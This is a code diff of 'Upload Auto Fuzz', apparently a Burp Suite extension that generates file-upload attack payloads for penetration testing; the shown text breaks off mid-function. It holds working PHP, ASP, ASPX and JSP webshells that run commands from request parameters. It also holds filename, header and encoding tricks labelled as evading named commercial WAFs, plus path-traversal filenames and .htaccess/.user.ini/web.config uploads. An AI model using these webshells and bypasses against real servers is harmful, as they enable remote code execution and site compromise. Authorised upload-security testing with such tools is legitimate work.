@@ -1,1497 +1,2135 @@
-# -*-coding:utf-8 -*-
+# -*- coding: utf-8 -*-
+"""
+Upload Auto Fuzz - Burp Suite Extension for File Upload Vulnerability Testing
+
+A comprehensive file upload vulnerability testing tool that generates intelligent
+payloads to bypass various security mechanisms including WAF, content-type validation,
+extension filtering, and more.
+
+Architecture:
+    - Strategy Pattern: Each bypass technique is encapsulated as a FuzzStrategy
+    - Factory Pattern: PayloadFactory manages strategy registration and payload generation
+    - Template Method: Base class defines the generation skeleton, subclasses implement specifics
+
+Author: T3nk0
+Version: 1.2.0
+License: MIT
+"""
 
 from burp import IBurpExtender
 from burp import IIntruderPayloadGeneratorFactory
 from burp import IIntruderPayloadGenerator
-import random
-from urllib import unquote
+from burp import ITab
+from javax.swing import (JPanel, JCheckBox, JLabel, JButton,
+                         BoxLayout, BorderFactory, UIManager,
+                         JScrollPane, JTextArea, SwingUtilities)
+from javax.swing.border import TitledBorder
+from java.awt import (GridBagLayout, GridBagConstraints, Insets, Dimension,
+                      FlowLayout, Font, Color, BorderLayout)
 import re
-import time
+import base64
+import hashlib
+from abc import ABCMeta, abstractmethod
 
-def getAttackPayloads(TEMPLATE):
-    # 获取文件前后缀
-    filename_suffix = re.search('filename=".*[.](.*)"', TEMPLATE).group(1)  # jpg
-    content_type = TEMPLATE.split('\n')[-1]
 
-    def script_suffix_Fuzz():
-        # 文件后缀绕过
-        asp_fuzz = ['asp;.jpg', 'asp.jpg', 'asp;jpg', 'asp/1.jpg', 'asp{}.jpg'.format(unquote('%00')), 'asp .jpg',
-                    'asp_.jpg', 'asa', 'cer', 'cdx', 'ashx', 'asmx', 'xml', 'htr', 'asax', 'asaspp', 'asp;+2.jpg']
-        aspx_fuzz = ['asPx', 'aspx .jpg', 'aspx_.jpg', 'aspx;+2.jpg', 'asaspxpx']
-        php_fuzz = ['php1', 'php2', 'php3', 'php4', 'php5', 'pHp', 'php .jpg', 'php_.jpg', 'php.jpg', 'php.  .jpg',
-                    'jpg/.php',
-                    'php.123', 'jpg/php', 'jpg/1.php', 'jpg{}.php'.format(unquote('%00')),
-                    'php{}.jpg'.format(unquote('%00')),
-                    'php:1.jpg', 'php::$DATA', 'php::$DATA......', 'ph\np']
-        jsp_fuzz = ['.jsp.jpg.jsp', 'jspa', 'jsps', 'jspx', 'jspf', 'jsp .jpg', 'jsp_.jpg']
-        
-        # 新增更多后缀绕过方式
-        asp_fuzz_new = ['asp.', 'asp;', 'asp,', 'asp:', 'asp%20', 'asp%00', 'asp%0a', 'asp%0d%0a', 
-                        'asp%0d', 'asp%0a%0d', 'asp%09', 'asp%0b', 'asp%0c', 'asp%0e', 'asp%0f', 
-                        'asp.jpg.asp', 'asp.jpg.asp.jpg', 'asp.asp.jpg', 'asp.jpg.123', 
-                        'asp.jpg...', 'asp.jpg/', 'asp.jpg\\', 'asp.jpg::$DATA']
-        
-        php_fuzz_new = ['php.', 'php;', 'php,', 'php:', 'php%20', 'php%00', 'phtml', 'pht', 'phpt', 
-                        'php7', 'php8', 'phar', 'pgif', 'php.jpg.php', 'php.jpg.php.jpg', 
-                        'php.php.jpg', 'php.jpg.123', 'php.jpg...', 'php.jpg/', 'php.jpg\\']
-        
-        # 组合所有后缀绕过方式
-        suffix_fuzz = asp_fuzz + aspx_fuzz + php_fuzz + jsp_fuzz + asp_fuzz_new + php_fuzz_new
+# =============================================================================
+# Constants and Configuration
+# =============================================================================
 
-        suffix_payload = []  # 保存文件后缀绕过的所有payload列表
+VERSION = "1.2.0"
+EXTENSION_NAME = "Upload_Auto_Fuzz {}".format(VERSION)
+MAX_PAYLOADS_DEFAULT = 2000
+MAX_FILENAME_LENGTH = 255
 
-        for each_suffix in suffix_fuzz:
-            # 测试每个上传后缀
-            TEMP_TEMPLATE = TEMPLATE
-            temp = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            suffix_payload.append(temp)
 
-        return suffix_payload
+# Supported backend languages with their executable extensions
+BACKEND_LANGUAGES = {
+    'php': ['php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phpt', 'phar', 'pgif'],
+    'asp': ['asp', 'asa', 'cer', 'cdx', 'htr'],
+    'aspx': ['aspx', 'ashx', 'asmx', 'asax'],
+    'jsp': ['jsp', 'jspa', 'jsps', 'jspx', 'jspf'],
+}
 
-    def CFF_Fuzz():
-        # Content-Disposition 绕过  form-data 绕过  filename 绕过
-        # Content-Disposition: form-data; name="uploaded"; filename="zc.jpg"
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        # Suffix = ['jsp']
-        Content_Disposition_payload = []  # 保存Content_Disposition绕过的所有payload列表
+# Common image MIME types for bypass
+IMAGE_MIME_TYPES = [
+    'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
+    'image/webp', 'image/svg+xml', 'image/tiff'
+]
 
-        # 遍历每个需要测试的上传后缀
-        for each_suffix in Suffix:
-            # 测试每个上传后缀
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix,
-                                                         each_suffix)  # TEMP_TEMPLATE_SUFFIX: Content-Disposition: form-data; name="uploaded"; filename="zc.后缀"
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX)
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(
-                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition', 'content-Disposition'))  # 改变大小写
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(
-                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: ', 'content-Disposition:'))  # 减少一个空格
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(
-                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: ', 'content-Disposition:  '))  # 增加一个空格
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', '~form-data'))
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', 'f+orm-data'))
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', '*'))
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(
-                TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;  '))  # 增加一个空格
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;'))  # 减少一个空格
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename===zc.{}'.format(
-                                                                                     each_suffix)))  # 过阿里云waf，删双引号绕过
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename==="zc.{}'.format(
-                                                                                     each_suffix)))  # 过阿里云waf，少双引号绕过
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename==="zc.{}"'.format(
-                                                                                     each_suffix)))  # 过阿里云waf，三个等号
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename="zc.{}\n"'.format(
-                                                                                     each_suffix)))  # 过阿里云waf，回车
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 '\nfilename==="zc.\n{}"'.format(
-                                                                                     each_suffix)))  # 过阿里云waf, 三个等号加回车
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename="zc.\nC.{}"'.format(
-                                                                                     each_suffix)))  # 过安全狗和云锁waf    # 待定，因为没法删掉Content-Type
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(
-                TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total, 'filename\n="zc.{}"'.format(each_suffix)))  # 过百度云waf
+# Magic bytes for file type spoofing
+MAGIC_BYTES = {
+    'jpg': '\xff\xd8\xff\xe0',
+    'png': '\x89PNG\r\n\x1a\n',
+    'gif': 'GIF89a',
+    'gif87': 'GIF87a',
+    'bmp': 'BM',
+    'pdf': '%PDF-1.5',
+    'zip': 'PK\x03\x04',
+}
 
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename="zc\.{}"'.format(
-                                                                                     each_suffix)))  # 过硬waf，反斜杠绕过
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename===zczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczc.{}'.format(
-                                                                                     each_suffix)))  # 过硬waf，超长文件名
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data',
-                                                                                 'form-data------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'))  # 过硬waf，超长-
+# WebShell templates for different languages
+WEBSHELL_TEMPLATES = {
+    'php': [
+        '<?php eval($_POST["cmd"]); ?>',
+        '<?php system($_REQUEST["cmd"]); ?>',
+        '<?= `$_GET[0]`; ?>',
+        '<?php $_GET[a]($_GET[b]); ?>',
+    ],
+    'asp': [
+        '<%eval request("cmd")%>',
+        '<%execute request("cmd")%>',
+    ],
+    'aspx': [
+        '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>',
+    ],
+    'jsp': [
+        '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
+        '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
+    ],
+}
 
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                 'filename="zc.jpg";filename="zc.{}"'.format(
-                                                                                     each_suffix)))  # 双参数
-            
-            # 新增绕过方式
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                'filename="zc.{}.jpg"'.format(
-                                                                                    each_suffix)))  # 双扩展名绕过
-            
-            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
-            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                                'filename="zc.jpg.{}"'.format(
-                                                                                    each_suffix)))  # 双扩展名绕过2
 
-        return Content_Disposition_payload
+# =============================================================================
+# Utility Functions
+# =============================================================================
 
-    def content_type_Fuzz():
-        # content_type = Content-Type: image/jpeg
-        content_type_payload = []  # 保存content_type绕过的所有payload列表
-        Suffix = ['asp', 'aspx', 'php', 'jsp']
-        # 遍历每个需要测试的上传后缀
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/gif'))  # 修改为image/gif
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/jpeg'))  # 修改为image/jpeg
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/php'))  # 修改为application/php
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: text/plain'))  # 修改为text/plain
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, ''))
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type', 'content-type'))  # 改变大小写
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type: ', 'Content-Type:  '))  # 冒号后面 增加一个空格
-                
-            # 新增Content-Type绕过方式
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/png'))  # 修改为image/png
-                
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/octet-stream'))  # 修改为二进制流
-                
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: multipart/form-data'))  # 修改为form-data
-                
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/x-httpd-php'))  # PHP专用
-                
-            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
-            content_type_payload.append(
-                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/x-asp'))  # ASP专用
-
-        return content_type_payload
-
-    def windows_features_Fuzz():
-        # Windows系统特性绕过
-        windows_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # NTFS数据流特性
-            TEMP_TEMPLATE_NTFS = TEMP_TEMPLATE_SUFFIX
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_NTFS).group(1)
-            windows_payload.append(TEMP_TEMPLATE_NTFS.replace(filename_total, 
-                                                            'filename="zc.{}::$DATA"'.format(each_suffix)))
-            
-            # IIS短文件名截断
-            TEMP_TEMPLATE_IIS = TEMP_TEMPLATE_SUFFIX
-            windows_payload.append(TEMP_TEMPLATE_IIS.replace(filename_total, 
-                                                           'filename="zc.{};.jpg"'.format(each_suffix)))
-            
-            # 交替数据流
-            TEMP_TEMPLATE_ADS = TEMP_TEMPLATE_SUFFIX
-            windows_payload.append(TEMP_TEMPLATE_ADS.replace(filename_total, 
-                                                           'filename="zc:{}"'.format(each_suffix)))
-            
-            # 保留设备名
-            for device in ['con', 'aux', 'nul', 'com1', 'com2', 'lpt1']:
-                TEMP_TEMPLATE_DEVICE = TEMP_TEMPLATE_SUFFIX
-                windows_payload.append(TEMP_TEMPLATE_DEVICE.replace(filename_total, 
-                                                                  'filename="{}.{}"'.format(device, each_suffix)))
-        
-        return windows_payload
-
-    def linux_features_Fuzz():
-        # Linux系统特性绕过
-        linux_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # Apache多级扩展名绕过
-            TEMP_TEMPLATE_APACHE = TEMP_TEMPLATE_SUFFIX
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_APACHE).group(1)
-            linux_payload.append(TEMP_TEMPLATE_APACHE.replace(filename_total, 
-                                                            'filename="zc.{}.png"'.format(each_suffix)))
-            
-            # 点号截断
-            TEMP_TEMPLATE_DOT = TEMP_TEMPLATE_SUFFIX
-            linux_payload.append(TEMP_TEMPLATE_DOT.replace(filename_total, 
-                                                         'filename="zc.{}."'.format(each_suffix)))
-            
-            # 路径遍历尝试
-            TEMP_TEMPLATE_PATH = TEMP_TEMPLATE_SUFFIX
-            linux_payload.append(TEMP_TEMPLATE_PATH.replace(filename_total, 
-                                                          'filename="../zc.{}"'.format(each_suffix)))
-            
-            # 特殊字符绕过
-            for char in ['/', '\\', '?', '*', '|', ':', '"', '<', '>']:
-                TEMP_TEMPLATE_SPECIAL = TEMP_TEMPLATE_SUFFIX
-                linux_payload.append(TEMP_TEMPLATE_SPECIAL.replace(filename_total, 
-                                                                 'filename="zc{}.{}"'.format(char, each_suffix)))
-        
-        return linux_payload
-
-    def magic_bytes_Fuzz():
-        # 添加文件魔术字节绕过
-        magic_bytes_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        # 常见文件魔术字节 (以字符串形式表示，避免二进制问题)
-        magic_bytes = {
-            'jpg': '\\xff\\xd8\\xff\\xe0',  # JPEG
-            'png': '\\x89PNG\\r\\n\\x1a\\n',  # PNG
-            'gif': 'GIF89a',  # GIF
-            'pdf': '%PDF-1.5'  # PDF
-        }
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            for magic_type, magic_byte in magic_bytes.items():
-                # 在Content-Type后添加魔术字节
-                if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                    content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_SUFFIX).group(0)
-                    TEMP_TEMPLATE_MAGIC = TEMP_TEMPLATE_SUFFIX
-                    magic_bytes_payload.append(
-                        TEMP_TEMPLATE_MAGIC.replace(content_type_line, content_type_line + '\r\n' + magic_byte))
-        
-        return magic_bytes_payload
+class Logger(object):
+    """Centralized logging utility for the extension."""
     
-    def file_content_trick_Fuzz():
-        # 文件内容欺骗技术
-        content_trick_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # 添加GIF89a文件头
-            TEMP_TEMPLATE_GIF = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Type:' in TEMP_TEMPLATE_GIF:
-                content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_GIF).group(0)
-                content_trick_payload.append(TEMP_TEMPLATE_GIF.replace(content_type_line, 
-                                                                     content_type_line + '\r\nGIF89a;'))
-            
-            # 添加PHP代码注释为图像内容
-            TEMP_TEMPLATE_PHP = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Type:' in TEMP_TEMPLATE_PHP and each_suffix == 'php':
-                content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_PHP).group(0)
-                content_trick_payload.append(TEMP_TEMPLATE_PHP.replace(content_type_line, 
-                                                                    content_type_line + '\r\n<?php /*'))
-                
-            # 添加SVG XML头
-            TEMP_TEMPLATE_SVG = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Type:' in TEMP_TEMPLATE_SVG:
-                content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_SVG).group(0)
-                svg_header = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"></svg>'
-                content_trick_payload.append(TEMP_TEMPLATE_SVG.replace(content_type_line, 
-                                                                     content_type_line + '\r\n' + svg_header))
-        
-        return content_trick_payload
+    _callbacks = None
+    _enabled = True
     
-    def user_ini_Fuzz():
-        # .user.ini文件包含链式利用
-        user_ini_payload = []
-        
-        # 上传.user.ini文件
-        TEMP_TEMPLATE = TEMPLATE
-        TEMP_TEMPLATE_INI = TEMP_TEMPLATE.replace(filename_suffix, 'user.ini')
-        filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_INI).group(1)
-        user_ini_payload.append(TEMP_TEMPLATE_INI.replace(filename_total, 'filename=".user.ini"'))
-        
-        # 上传.htaccess文件
-        TEMP_TEMPLATE = TEMPLATE
-        TEMP_TEMPLATE_HTACCESS = TEMP_TEMPLATE.replace(filename_suffix, 'htaccess')
-        filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_HTACCESS).group(1)
-        user_ini_payload.append(TEMP_TEMPLATE_HTACCESS.replace(filename_total, 'filename=".htaccess"'))
-        
-        # 上传web.config文件 (IIS)
-        TEMP_TEMPLATE = TEMPLATE
-        TEMP_TEMPLATE_WEBCONFIG = TEMP_TEMPLATE.replace(filename_suffix, 'config')
-        filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_WEBCONFIG).group(1)
-        user_ini_payload.append(TEMP_TEMPLATE_WEBCONFIG.replace(filename_total, 'filename="web.config"'))
-        
-        return user_ini_payload
-
-    def mime_encoding_Fuzz():
-        # MIME编码绕过 (RFC 2047)
-        mime_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # RFC 2047编码
-            TEMP_TEMPLATE_MIME = TEMP_TEMPLATE_SUFFIX
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_MIME).group(1)
-            mime_payload.append(TEMP_TEMPLATE_MIME.replace(filename_total, 
-                                                         'filename="=?utf-8?Q?zc.{}?="'.format(each_suffix)))
-            
-            # Base64编码变种
-            import base64
-            encoded_filename = base64.b64encode("zc.{}".format(each_suffix))
-            TEMP_TEMPLATE_B64 = TEMP_TEMPLATE_SUFFIX
-            mime_payload.append(TEMP_TEMPLATE_B64.replace(filename_total, 
-                                                        'filename="=?utf-8?B?{}?="'.format(encoded_filename)))
-            
-            # 混合编码
-            TEMP_TEMPLATE_MIXED = TEMP_TEMPLATE_SUFFIX
-            mime_payload.append(TEMP_TEMPLATE_MIXED.replace(filename_total, 
-                                                          'filename="=?utf-8?Q?zc=2E{}?="'.format(each_suffix)))
-        
-        return mime_payload
+    @classmethod
+    def init(cls, callbacks):
+        cls._callbacks = callbacks
     
-    def http_protocol_split_Fuzz():
-        # HTTP协议拆分绕过
-        http_split_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # 多个Content-Disposition字段
-            TEMP_TEMPLATE_MULTI = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Disposition:' in TEMP_TEMPLATE_MULTI:
-                content_disp = re.search(r'(Content-Disposition:.*?filename=".*?")', TEMP_TEMPLATE_MULTI, re.DOTALL).group(1)
-                name_part = re.search(r'(name=".*?";)', content_disp)
-                filename_part = re.search(r'(filename=".*?")', content_disp)
-                
-                if name_part and filename_part:
-                    name_part = name_part.group(1)
-                    filename_part = filename_part.group(1)
-                    
-                    # 拆分为两个字段
-                    new_content = content_disp.replace("{} {}".format(name_part, filename_part), 
-                                                    "{}\r\nContent-Disposition: {}".format(name_part, filename_part))
-                    http_split_payload.append(TEMP_TEMPLATE_MULTI.replace(content_disp, new_content))
-            
-            # 插入额外的分号
-            TEMP_TEMPLATE_SEMICOLON = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SEMICOLON:
-                content_disp = re.search(r'(Content-Disposition:.*?filename=".*?")', TEMP_TEMPLATE_SEMICOLON, re.DOTALL).group(1)
-                modified_content = content_disp.replace('form-data;', 'form-data;;;;')
-                http_split_payload.append(TEMP_TEMPLATE_SEMICOLON.replace(content_disp, modified_content))
-        
-        return http_split_payload
+    @classmethod
+    def info(cls, message):
+        if cls._enabled:
+            print("[INFO] {}".format(message))
     
-    def chunked_encoding_Fuzz():
-        # 分块传输编码绕过
-        chunked_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # 添加Transfer-Encoding: chunked头
-            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                TEMP_TEMPLATE_CHUNKED = TEMP_TEMPLATE_SUFFIX
-                chunked_header = 'Transfer-Encoding: chunked\r\n'
-                chunked_payload.append(TEMP_TEMPLATE_CHUNKED.replace('Content-Type:', 
-                                                                   chunked_header + 'Content-Type:'))
-        
-        return chunked_payload
+    @classmethod
+    def debug(cls, message):
+        if cls._enabled:
+            print("[DEBUG] {}".format(message))
     
-    def waf_bypass_Fuzz():
-        # WAF对抗技术
-        waf_bypass_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # 双重URL编码
-            TEMP_TEMPLATE_DOUBLE_URL = TEMP_TEMPLATE_SUFFIX
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_DOUBLE_URL).group(1)
-            double_encoded = 'filename="zc.%252566ile"'  # %2566ile解码后为%66ile，再解码为file
-            waf_bypass_payload.append(TEMP_TEMPLATE_DOUBLE_URL.replace(filename_total, double_encoded))
-            
-            # 数据包污染（添加大量随机数据）
-            TEMP_TEMPLATE_POLLUTION = TEMP_TEMPLATE_SUFFIX
-            if 'Content-Disposition:' in TEMP_TEMPLATE_POLLUTION:
-                import random
-                import string
-                random_data = ''.join(random.choice(string.ascii_letters) for _ in range(1024))
-                random_comment = 'X-Random-Data: {}\r\n'.format(random_data)
-                waf_bypass_payload.append(TEMP_TEMPLATE_POLLUTION.replace('Content-Disposition:', 
-                                                                        random_comment + 'Content-Disposition:'))
-        
-        return waf_bypass_payload
+    @classmethod
+    def error(cls, message):
+        print("[ERROR] {}".format(message))
+    
+    @classmethod
+    def warn(cls, message):
+        print("[WARN] {}".format(message))
 
-    def unicode_normalization_Fuzz():
-        # Unicode归一化绕过技术 - 简化版
-        unicode_payload = []
-        Suffix = ['php']  # 只对PHP文件使用，减少payload数量
-        
-        # 简化的Unicode字符映射
-        unicode_chars = {
-            'p': [u'p', u'\u03c1'],  # 拉丁p、希腊rho
-            'h': [u'h'],
-            'a': [u'a'],
-            's': [u's'],
-            'j': [u'j']
-        }
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
-            
-            # 只创建几个最有效的同形异义字符组合
-            unicode_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
-                                                             'filename="zc.\u03c1hp"'))  # 使用希腊rho替代p
-            unicode_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
-                                                             'filename="zc.p\u04bbp"'))  # 使用西里尔h
-        
-        return unicode_payload
 
-    def http_header_smuggling_Fuzz():
-        # HTTP头走私/走私技术
-        header_smuggling_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
